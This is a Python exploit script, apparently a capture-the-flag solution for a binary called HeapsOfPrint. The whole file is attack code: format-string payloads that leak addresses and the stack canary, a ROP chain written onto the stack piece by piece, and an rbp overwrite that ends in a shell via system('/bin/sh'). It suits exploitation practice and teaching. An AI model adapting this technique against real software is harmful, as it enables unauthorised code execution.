# File: exp.py
# Author: raycp
# Date: 2019-06-09
# Description: exp for HeapsOfPrint, form a loop by format vlun and write by rbp

from pwn_debug import *


pdbg=pwn_debug("./HeapsOfPrint")

pdbg.context.terminal=['tmux', 'splitw', '-h']

#pdbg.local()
pdbg.debug("2.27")
#pdbg.remote('127.0.0.1', 22)
#p=pdbg.run("local")
#p=pdbg.run("remote")
p=pdbg.run("debug")

membp=pdbg.membp
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc

#io_file=IO_FILE_plus()
#io_file.show()

def format_one(payload):
    p.sendline(payload)


def write_one(rbp,value,addr,target_stack):
    printed=0
    print hex(rbp),hex(value),hex(addr),hex(target_stack)
    # form a loop
    return_addr=(rbp+8)&0xffff
    payload="%1c%1c%1c%1c"
    payload+='%%%dc%%hn'%(return_addr-4)
    payload+='%1c%1c'
    
    
    off3=0xb3+0x10000
    payload+='%%%dc%%hhn'%(off3-return_addr-2)

    printed=off3

    off=(target_stack-rbp)/8+6
    addr=(addr&0xffff)+0x10000
    print off
    payload+="%1c"*(off-2-10)
    payload+="%%%dc"%(addr-printed-(off-2-10))
    payload+="%hn"
    
    
    target_addr=target_stack+0xf8
    off2=(target_addr-rbp)/8+6

    printed=addr
    value=0x10000+value
    if value>printed:
        print 2
        payload+="%1c"*(off2-off-2)
        payload+="%%%dc%%hn"%(value-printed-(off2-off-2))
    else:
        print 1
        value=value+0x10000
        payload+="%1c"*(off2-off-2)
        payload+="%%%dc%%hn"%(value-printed-(off2-off-2))

    log.info("value: 0x%x"%(value))
    log.info("printed: 0x%x"%(printed))
    p.sendline(payload)
    p.recvuntil("Is it?")



def write_payload(payload,playgroud,rbp,target_stack):
        
    for i in range(0,len(payload),2):
        index=(playgroud-(rbp-0x18*(i+1))/8)+6
        write_one(rbp-0x18*(i/2),u16(payload[i:i+2]),playgroud+i,target_stack)
        #raw_input("next>")
    




def first_attack():
    p.recvuntil("character is ")
    last_byte=u8(p.recvuntil(" (a")[:-3])
    log.info("last byte: 0x%x"%(last_byte))

    addr=last_byte-0xf
    payload="%1c%1c%1c%1c"
    payload+='%%%dc%%hhn'%(addr-4)
    payload+='%1c'
    payload+='%%%dc%%10$hhn'%(0xb3-addr-1)
    payload+='**%6$p**%7$p**%9$p**%17$p**'
    format_one(payload)

    

def pwn():
    
    #pdbg.bp([0x8a8,0x8e1])
    # step1 first attack to leak address
    first_attack()
    p.recvuntil("**")
    stack_addr=int(p.recvuntil("**")[:-2],16)
    pro_base=int(p.recvuntil("**")[:-2],16)-0x8f0
    canary=int(p.recvuntil("**")[:-2],16)
    libc_base=int(p.recvuntil("**")[:-2],16)-libc.symbols['__libc_start_main']-238
    log.info("leak libc base: 0x%x"%(libc_base))
    log.info("leak canary: 0x%x"%(canary))
    log.info("leak pro base: 0x%x"%(pro_base))
    log.info("stack addr: 0x%x"%(stack_addr))

    prdi_ret=pro_base+0x00000000000009f3 #: pop rdi ; ret

    system_addr=libc_base+libc.symbols['system']
    bin_sh_addr=libc_base+next(libc.search('/bin/sh\x00'))


    rbp = stack_addr-0x20

    rbp=rbp-0x18
    target_stack=rbp+0x58
    
    playgroud=rbp+0x100
    payload=p64(prdi_ret)+p64(bin_sh_addr)+p64(system_addr)
    log.info("bin sh addr: 0x%x"%(bin_sh_addr))
    # step2 write rop to playgroud
    write_payload(payload,playgroud,rbp,target_stack)
    
    # step3 go back to main 
    main_addr=pro_base+0x906
    right_now_rbp=rbp-0x120
    rbp_addr=(right_now_rbp+8)&0xffff
    play_addr=(main_addr)&0xffff
    if play_addr<rbp_addr:
        play_addr+=0x10000
    payload="%1c%1c%1c%1c"
    payload+='%%%dc%%hn'%(rbp_addr-4)
    payload+='%1c%1c'
    payload+='%%%dc%%hn'%(play_addr-rbp_addr-2)
    
    p.sendline(payload)

    # step4 overwrite rbp to playgroud-8 to execute rop chain to get shell.
    payload="%%%dc%%%d$hn"%((playgroud-8)&0xffff,6)
    p.sendline(payload)


    p.interactive() 

if __name__ == '__main__':
    pwn()


